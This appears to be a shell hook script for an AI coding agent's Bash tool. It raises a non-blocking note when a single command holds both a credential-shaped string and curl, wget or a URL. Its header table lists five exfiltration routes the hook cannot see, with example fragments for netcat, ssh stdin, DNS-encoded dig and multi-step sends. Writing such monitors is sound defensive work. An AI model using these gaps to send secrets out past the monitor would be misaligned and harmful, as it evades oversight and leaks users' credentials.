#!/usr/bin/env bash
# advisory-egress-secret.sh — PreToolUse(Bash) egress-correlation advisory (plan H3 · LLM02).
#
# Fires a NON-BLOCKING note (exit 0, ALWAYS) plus a durable record when a SINGLE Bash command
# carries BOTH a credential-shaped literal AND an outbound-destination token (curl / wget / an
# http(s):// URL). It raises the bar and adds visibility on common fetch paths — nothing more.
#
# WHY advisory, never blocking: a blocking control at this coverage profile would fail closed on
# legitimate traffic while the vectors below stay open — cost with little assurance (plan H3). The
# honest deliverable at the command-line-hook layer is visibility, so this hook only notes.
#
# SECURITY (masking): neither the stderr note nor the durable record carries the secret bytes —
# only the credential CLASS and the outbound kind are recorded (core-security: logs MUST mask
# secrets). The raw command already sits in the live transcript; persisting it would copy the
# secret to disk.
#
# COVERAGE TABLE — what this advisory observes, and the residue it CANNOT see.
# Sited with the secret-hook documentation (validate-secret-scan.sh / detect-secret-file-write.sh
# self-document their coverage boundary in-header; this hook follows that convention). This is a
# Bash-string heuristic on ONE command line; it does NOT confine outbound traffic and is NOT a
# barrier against outbound secret movement. The residue below is declared open, not overlooked.
#
#   OBSERVED (advisory note fires):
#     - a credential-shaped literal AND an outbound fetch verb (curl / wget) or a URL scheme
#       (http:// | https://), both present in the SAME command string.
#
#   NOT OBSERVED — five declared-open vectors (each carries the payload past a command-line regex):
#     | # | vector          | why a PreToolUse command-line hook cannot see it                  |
#     |---|-----------------|-------------------------------------------------------------------|
#     | 1 | netcat (nc)     | nc host port < secret — the payload is a FILE, not on the line     |
#     | 2 | python-socket   | interpreter-mediated send; the value is resolved at runtime, so    |
#     |   |                 | it is not an inline command-line literal                          |
#     | 3 | ssh-transported | ssh host 'cat > x' < secret — the payload travels via stdin        |
#     | 4 | dns-encoded     | dig $(...).host — the secret is encoded into a DNS label at run    |
#     | 5 | multi-step      | read-then-send split across SEPARATE tool calls — no single        |
#     |   |                 | command carries both halves                                       |
#
# Fail-open on any internal error (an advisory must never interfere with the command). Bash 3.2+
# (macOS stock). python3-absent → field extraction degrades to empty → silent exit 0 (advisory
# fail-open; a security gate would fail closed here, but this hook only adds visibility).
set -Eeuo pipefail
IFS=$'\n\t'

# fail-open ERR trap — an advisory hook must NEVER block a command on its own failure.
trap 'printf "[egress-secret-advisory] internal error at line %d: %s — fail-open (exit 0)\n" "${LINENO}" "${BASH_COMMAND}" >&2; exit 0' ERR

# shellcheck source=hook-utils.sh
source "${BASH_SOURCE%/*}/hook-utils.sh"

# Durable record sink (env-overridable for hermetic tests). DATA-tier via the resolved HOOK_DATA_DIR
# seam (hook-utils.sh) — GA_DATA_ROOT-anchored, decoupled from the legacy ~/.claude location.
EGRESS_SECRET_ADVISORY_FIRED_LOG="${EGRESS_SECRET_ADVISORY_FIRED_LOG:-${HOOK_DATA_DIR}/egress-secret-advisory-fired.log}"

# Credential-shaped classes — parallel pattern/label arrays. The gate folds the patterns into one
# ERE; the label is resolved only after the gate fires (cheap). Patterns mirror validate-secret-scan.sh
# CRED_VALUE plus a JWT shape — one proven credential vocabulary, no bespoke drift.
CRED_PATTERNS=(
  'AKIA[0-9A-Z]{16}'
  'ghp_[a-zA-Z0-9]{36}'
  'sk-[a-zA-Z0-9]{20,}'
  'AIza[0-9A-Za-z_-]{35}'
  'xox[bpoa]-[0-9a-zA-Z-]+'
  'eyJ[a-zA-Z0-9_-]*\.eyJ'
  '(password|passwd|api[_-]?key|secret|token|access[_-]?key|aws_secret_access_key)["'"'"' ]*[:=][ ]*["'"'"']?[^[:space:]"'"'"']{8,}'
)
CRED_LABELS=(
  aws-access-key
  github-token
  openai-key
  google-api-key
  slack-token
  jwt
  generic-credential
)

# Outbound-destination token: a common fetch verb (curl / wget, word-anchored) or a URL scheme.
# Deliberately NOT nc / ssh / python-socket — those are the declared-open vectors in the coverage
# table, and matching them would contradict the documented residue.
readonly OUTBOUND_DEST='(^|[^[:alnum:]_])(curl|wget)([^[:alnum:]_]|$)|https?://'

# Fold the credential patterns into ONE ERE alternation (top-level `|` = lowest precedence, so each
# class's internal groups stay intact).
cred_shaped="$(hook_join_alt "${CRED_PATTERNS[@]}")"

# Resolve WHICH credential class matched (first hit) — records the CLASS name, never the value.
# Args: $1 = command string. Echoes the label; `unknown` if none re-matches (should not happen
# after the gate fired, but keeps the record well-formed).
classify_cred() {
  local cmd="${1}" i
  for i in "${!CRED_PATTERNS[@]}"; do
    if printf '%s\n' "${cmd}" | grep -qiE -- "${CRED_PATTERNS[${i}]}"; then
      printf '%s\n' "${CRED_LABELS[${i}]}"
      return 0
    fi
  done
  printf '%s\n' "unknown"
}

# Resolve the outbound-destination kind for the record. Args: $1 = command string.
classify_outbound() {
  local cmd="${1}"
  if printf '%s\n' "${cmd}" | grep -qE -- '(^|[^[:alnum:]_])curl([^[:alnum:]_]|$)'; then
    printf '%s\n' "curl"
  elif printf '%s\n' "${cmd}" | grep -qE -- '(^|[^[:alnum:]_])wget([^[:alnum:]_]|$)'; then
    printf '%s\n' "wget"
  else
    printf '%s\n' "url"
  fi
}

# Append one fail-SAFE durable record — subshell + `|| true` isolates the ERR trap so a write
# failure can never change the exit code. NO secret bytes: class + kind + session only.
# Args: $1 = cred_class · $2 = outbound_kind · $3 = session_id.
emit_record() {
  local cred_class="${1}" outbound_kind="${2}" session_id="${3}"
  (
    local log_dir ts
    log_dir="$(dirname -- "${EGRESS_SECRET_ADVISORY_FIRED_LOG}")"
    mkdir -p -- "${log_dir}" 2>/dev/null || exit 0
    ts="$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null)" || ts="unknown"
    printf '%s\tevent=egress-secret-correlation\tcred_class=%s\toutbound=%s\tsession=%s\n' \
      "${ts}" "${cred_class}" "${outbound_kind}" "${session_id}" \
      >>"${EGRESS_SECRET_ADVISORY_FIRED_LOG}" 2>/dev/null || exit 0
  ) 2>/dev/null || true
}

# 1. Read input + Bash tool gate.
input="$(hook_read_input)"
tool_name="$(hook_get_field "${input}" "tool_name")"
[[ "${tool_name}" != "Bash" ]] && exit 0

# 2. Extract the command; empty (or python3-absent) → nothing to correlate → silent exit 0.
command_str="$(hook_get_tool_input "${input}" "command")"
[[ -z "${command_str}" ]] && exit 0

# 3. Dual-condition correlation gate: BOTH a credential-shaped literal AND an outbound token.
#    Either alone → silent (the negative set: an ordinary network command carries no note).
printf '%s\n' "${command_str}" | grep -qiE -- "${cred_shaped}" || exit 0
printf '%s\n' "${command_str}" | grep -qiE -- "${OUTBOUND_DEST}" || exit 0

# 4. Correlated → resolve masked class/kind, write the durable record, emit the visible note, exit 0.
session_id="$(hook_get_field "${input}" "session_id")"
cred_class="$(classify_cred "${command_str}")"
outbound_kind="$(classify_outbound "${command_str}")"
emit_record "${cred_class}" "${outbound_kind}" "${session_id}"

reason="credential-shaped material (${cred_class}) appears alongside an outbound destination (${outbound_kind}) in one Bash command. Advisory only — this does NOT block and is NOT a barrier against outbound secret movement. Five vectors stay open (netcat, python-socket, ssh-transported, dns-encoded, multi-step); see the coverage table in this hook's header. Verify this command is not sending a secret off-box."
printf '[egress-secret-advisory] %s\n' "${reason}" >&2

exit 0
